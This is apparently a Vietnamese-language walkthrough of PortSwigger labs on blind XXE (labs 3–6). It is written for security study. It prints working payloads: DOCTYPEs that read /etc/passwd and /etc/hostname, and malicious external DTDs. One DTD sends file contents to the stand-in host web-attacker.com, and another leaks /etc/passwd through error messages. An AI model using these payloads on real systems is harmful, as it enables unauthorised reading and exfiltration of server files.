# [Lab 3: Blind XXE with out-of-band interaction](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)

![Yêu cầu lab 3](../image/lab3/0.png)

> - **Mô tả lab:** Chức năng `Check stock` phân tích cú pháp đầu vào XML nhưng không hiển thị kết quả trong response. Tuy nhiên có thể phát hiện lỗ hổng `blind XXE` bằng cách kích hoạt OOB.
> 
> - **Mục tiêu:** Sử dụng một thực thể bên ngoài để làm cho trình phân tích cú pháp XML phát hành tra cứu DNS và yêu cầu HTTP tới `Burp Colaborator`.

Chèn XML nhưng response không hề có kết quả trả về khi thực hiện cú pháp.

![Alt text](../image/lab3/01.png)

Ta sẽ khai thác `Blind XXE` bằng cách kích hoạt OOB

![Alt text](../image/lab3/02.png)

phản hồi từ `Collaborator`

![Alt text](../image/lab3/03.png)

sovle the lab

![Alt text](../image/lab3/04.png)

> **Test bằng Active Scan**

![Alt text](../image/lab3/05.png)

![Alt text](../image/lab3/06.png)

# [Lab 4: Blind XXE with out-of-band interaction via XML parameter entities](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities)

![Yêu cầu lab 4](../image/lab4/0.png)

> - **Mô tả lab:** Chức năng `Check stock` phân tích cú pháp đầu vào XML nhưng không hiển thị kết quả không mong muốn và chặn các yêu cầu chứa các thực thể từ bên ngoài.
> 
> - **Mục tiêu:** Sử dụng một thực thể bên ngoài để làm cho trình phân tích cú pháp XML phát hành tra cứu DNS và yêu cầu HTTP tới `Burp Colaborator`.

Khi thực hiện chèn thực thế từ bên ngoài, thì bị block `Entities are not allowed for security reasons`

![Alt text](../image/lab4/01.png)

Test tiếp, ta sẽ bypass bằng sử dụng tham số `%xxe`: `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]>`

![Alt text](../image/lab4/02.png)

Tuy nhiên chỉ hiển thị lỗi mà không có trả về kết quả của ta mong muốn, vậy là `Blind XXE`, ta sẽ kích hoạt OOB: `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://domain"> %xxe; ]>`

![Alt text](../image/lab4/03.png)

nhưng bên này nhận được DNS rồi

![Alt text](../image/lab4/04.png)

solve the lab

![Alt text](../image/lab4/05.png)

> **Test bằng Active Scan**

![Alt text](../image/lab4/06.png)

![Alt text](../image/lab4/07.png)

# [Lab 5: Exploiting blind XXE to exfiltrate data using a malicious external DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)

![Yêu cầu lab 5](../image/lab5/0.png)

> - **Mô tả lab:** Có tính năng `Check stock` để phân tích dữ liệu đầu vào XML nhưng không hiển thị kết quả. 
> 
> - **Mục tiêu:** Lọc nội dung của tệp `/etc/hostname`.

Test thử một lúc thì phát hiện dạng là `Blind XXE` rồi vì chỉ có trả về thông báo chứ không có dữ liệu gì cả, và ta có thể kích hoạt OOB.

![main web](../image/lab5/01.png)

Phản hồi từ `Collaborator`

![Alt text](../image/lab5/02.png)

Vì cần đọc được nội dung file `/etc/hostname`, nên ta cần tạo 1 DTD độc hại để đọc được nội dung file này

    <!ENTITY % file SYSTEM "file:///etc/hostname">
    <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
    %eval;
    %exfiltrate;

- Có 2 thực thể được định nghĩa là `%file` và `%eval`

    - `%file` được trỏ đến tệp `/etc/hostname`

    - `%eval` được định nghĩa để tạo thực thể khác là `%exfiltrate`

    - `%exfiltrate` gửi thông tin về tệp tin `/etc/hostname` tới trang web `http://web-attacker.com/`

![Alt text](../image/lab5/03.png)

Store lại và file DTD sẽ được lưu tại `URL` ở đầu trang

Cuối cùng, tấn công gửi XXE: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>`

![Alt text](../image/lab5/04.png)

Quan sát từ `Collaborator`, ta đã thấy nội dung file được trả về

![Alt text](../image/lab5/05.png)

submit và solve lab

![Alt text](../image/lab5/06.png)

> **Test bằng Active Scan**

![Alt text](../image/lab5/07.png)

![Alt text](../image/lab5/08.png)

# [Lab 6: Exploiting blind XXE to retrieve data via error messages](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages)

![Yêu cầu lab 6](../image/lab6/0.png)

> - **Mô tả lab:** Có tính năng `Check stock` để phân tích dữ liệu đầu vào XML nhưng không hiển thị kết quả.
> 
> - **Mục tiêu:** Sử dụng DTD bên ngoài để kích hoạt thông báo lỗi hiển thị nội dung của tệp `/etc/passwd`. 

Khi ta chèn cú pháp XML thì trong phản hồi của ứng dụng có chỉ ra lỗi khi phân tích cú pháp

![Alt text](../image/lab6/01.png)

Giờ ta sẽ tạo 1 file DTD độc hại để kích hoạt thông báo lỗi phân tích cú pháp XML chứa nội dung tệp `/etc/passwd`

    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
    %eval;
    %error;

- Có 2 thực thể được định nghĩa là `%file` và `%eval`

    - `%file` được trỏ đến tệp `/etc/passwd`

    - `%eval` được định nghĩa để tạo thực thể khác là `%error`

    - `%error` trỏ tới một tệp không tồn tại chứa thông tin của tệp `/etc/passwd`

![Alt text](../image/lab6/02.png)

Sau khi Store thì file sẽ được lưu tại `URL` hiển thị ở đầu trang

Cuối cùng là gửi tấn công XXE: `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe; ]>` và hiển thị thành công lỗi khi phân tích cú pháp XML

![Alt text](../image/lab6/03.png)

solve lab

![Alt text](../image/lab6/04.png)

> **Test bằng Active Scan**

![Alt text](../image/lab6/05.png)

![Alt text](../image/lab6/06.png)